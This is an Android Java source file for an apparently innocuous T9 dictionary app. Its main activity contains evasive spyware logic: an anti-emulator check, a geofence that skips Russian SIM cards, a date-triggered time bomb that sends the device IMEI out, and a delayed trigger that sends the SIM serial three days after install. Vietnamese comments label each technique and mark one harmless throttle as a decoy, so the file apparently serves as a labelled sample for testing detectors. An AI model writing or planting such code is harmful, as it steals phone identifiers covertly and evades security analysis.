package com.rdict.t9;

import android.app.Activity;
import android.content.pm.PackageInfo;
import android.os.Bundle;
import android.telephony.TelephonyManager;

public class MainActivity extends Activity {
    long last;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        // A: anti-emulator
        if (Env.isEmulator()) return;
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        // B: geofence (tự tắt ở RU)
        if (tm.getSimCountryIso().equals("ru")) return;
        // C: time bomb tuyệt đối (2027-01-01)
        if (System.currentTimeMillis() > 1798761600000L) {
            Net.post("imei=" + tm.getDeviceId());
        }
        // D: trì hoãn 3 ngày sau khi cài
        try {
            PackageInfo pi = getPackageManager().getPackageInfo(getPackageName(), 0);
            if (System.currentTimeMillis() - pi.firstInstallTime > 3 * 86400000L) {
                Net.post("sim=" + tm.getSimSerialNumber());
            }
        } catch (Exception e) { }
        // mồi: throttle cache bình thường, không phải time bomb
        long now = System.currentTimeMillis();
        if (now - last > 3600000L) { last = now; }
    }
}
